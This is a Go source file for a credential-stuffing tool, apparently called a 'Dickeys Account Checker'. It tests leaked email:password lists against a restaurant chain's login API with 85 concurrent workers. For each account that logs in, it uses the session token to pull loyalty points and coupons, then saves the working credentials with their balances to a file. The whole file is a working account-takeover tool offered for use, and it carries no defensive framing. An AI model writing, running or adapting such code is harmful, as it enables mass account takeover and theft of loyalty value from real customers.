package main

import (
	"bufio"
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
	"github.com/fatih/color"
)

type Dickeys struct{}

type LoginResponse struct {
	JwtToken string `json:"jwt_token"`
	PersonID string `json:"person_id"`
}

type ViewerResponse struct {
	Data struct {
		Viewer struct {
			PersonConnection struct {
				Edges []struct {
					Node struct {
						Login struct {
							LifetimePoints  int `json:"lifetimePoints"`
							SpendablePoints int `json:"spendablePoints"`
						} `json:"login"`
					} `json:"node"`
				} `json:"edges"`
			} `json:"personConnection"`
		} `json:"viewer"`
	} `json:"data"`
}

var validCount int
var invalidCount int
var mu sync.Mutex
var startTime time.Time

func setConsoleTitle(title string) {
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	setConsoleTitle := kernel32.NewProc("SetConsoleTitleW")
	setConsoleTitle.Call(uintptr(unsafe.Pointer(windows.StringToUTF16Ptr(title))))
}

func updateConsoleTitle() {
	elapsed := time.Since(startTime)
	hours := int(elapsed.Hours())
	minutes := int(elapsed.Minutes()) % 60
	seconds := int(elapsed.Seconds()) % 60
	title := fmt.Sprintf("Dickeys Account Checker | github.com/H4cK3dR4Du | discord.gg/raducord | Valid: %d ~ Invalid: %d | Time Elapsed: (%dh, %dm %ds)", validCount, invalidCount, hours, minutes, seconds)
	setConsoleTitle(title)
}

func (d *Dickeys) dickeys(email, password string) {
	payload := map[string]string{
		"email":    email,
		"password": password,
	}
	payloadBytes, _ := json.Marshal(payload)

	resp, err := http.Post("https://2fjcaws5j1.execute-api.us-east-1.amazonaws.com/production/login/loginOLO", "application/json", bytes.NewBuffer(payloadBytes))
	if err != nil {
		fmt.Println("Error:", err)
		return
	}
	defer resp.Body.Close()

	body, _ := ioutil.ReadAll(resp.Body)
	if strings.Contains(string(body), "Your Email or Password is incorrect. Please try again !") {
		color.Red("[ ✖️ ] Invalid Account: %s, %s", email, password)
		mu.Lock()
		invalidCount++
		updateConsoleTitle()
		mu.Unlock()
		return
	}

	color.Green("[ ✔️ ] Valid Account: %s, %s", email, password)
	mu.Lock()
	validCount++
	updateConsoleTitle()
	mu.Unlock()

	var loginResp LoginResponse
	json.Unmarshal(body, &loginResp)

	data := `{"operationName":null,"variables":{"itemimageFilter":{"label":{"eq":"375x167"}},"unusedCouponsFilter":[{"usedOn":{"null":true},"validUntil":{"gte":"2024-04-06 21:47:52"}}],"includePersonConnection":true},"query":"query ($unusedCouponsFilter: [PersonCouponFilter], $includePersonConnection: Boolean!) {  viewer {    id    accessLevel    ...personCouponsFragment    __typename  }}fragment personCouponsFragment on Viewer {  personConnection(first: 1) @include(if: $includePersonConnection) {    edges {      node {        id        login {          id          lifetimePoints          spendablePoints          newLoyaltyLifetimePoints          __typename        }        usedCoupons: personCouponConnection(sort: {usedOn: DESC}, filter: [{usedOn: {null: false}}]) {          totalCount          edges {            node {              id              validUntil              usedOn              lineId              coupon {                id                code                description                imageURL                coupontypeId                label                __typename              }              __typename            }            __typename          }          __typename        }        availableCoupons: personCouponConnection(sort: {created: DESC}, filter: $unusedCouponsFilter) {          totalCount          edges {            node {              id              validUntil              usedOn              lineId              coupon {                id                description                imageURL                coupontypeId                code                label                couponActionConnection {                  edges {                    node {                      id                      target                      __typename                    }                    __typename                  }                  __typename                }                __typename              }              __typename            }            __typename          }          __typename        }        __typename      }      __typename    }    __typename  }  __typename}"}`

	req, _ := http.NewRequest("POST", "https://orders-api.dickeys.com/", bytes.NewBuffer([]byte(data)))
	req.Header.Set("Authorization", "Bearer "+loginResp.JwtToken)
	req.Header.Set("brandid", "1")
	req.Header.Set("Content-Type", "application/json")

	client := &http.Client{}
	resp2, err := client.Do(req)
	if err != nil {
		fmt.Println("Error:", err)
		return
	}
	defer resp2.Body.Close()

	body2, _ := ioutil.ReadAll(resp2.Body)

	var viewerResp ViewerResponse
	json.Unmarshal(body2, &viewerResp)

	spendablePoints := viewerResp.Data.Viewer.PersonConnection.Edges
	for _, point := range spendablePoints {
		login := point.Node.Login
		sp := login.SpendablePoints
		lf := login.LifetimePoints

		f, err := os.OpenFile("data/valid_accounts.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
		if err != nil {
			fmt.Println("Error:", err)
			return
		}
		defer f.Close()
		f.WriteString(fmt.Sprintf("%s:%s | Person ID: %s | Points: %d | Lifetime Points: %d\n", email, password, loginResp.PersonID, sp, lf))
	}
}

func accounts() [][2]string {
	var accounts [][2]string
	file, err := os.Open("data/accounts.txt")
	if err != nil {
		fmt.Println("Error:", err)
		return accounts
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := scanner.Text()
		creds := strings.Split(line, ":")
		if len(creds) == 2 {
			accounts = append(accounts, [2]string{creds[0], creds[1]})
		}
	}
	if err := scanner.Err(); err != nil {
		fmt.Println("Error:", err)
	}
	return accounts
}

func main() {
	setConsoleTitle("Dickeys Account Checker | github.com/H4cK3dR4Du | discord.gg/raducord | Valid: 0 ~ Invalid: 0 | Time Elapsed: (0h, 0m 0s)")
	startTime = time.Now()

	yes := accounts()
	var wg sync.WaitGroup
	semaphore := make(chan struct{}, 85)

	for _, creds := range yes {
		wg.Add(1)
		semaphore <- struct{}{}
		go func(creds [2]string) {
			defer wg.Done()
			defer func() { <-semaphore }()
			d := Dickeys{}
			d.dickeys(creds[0], creds[1])
		}(creds)
	}

	wg.Wait()
	fmt.Println("Done! github.com/H4cK3dR4Du")
	fmt.Scanln()
}
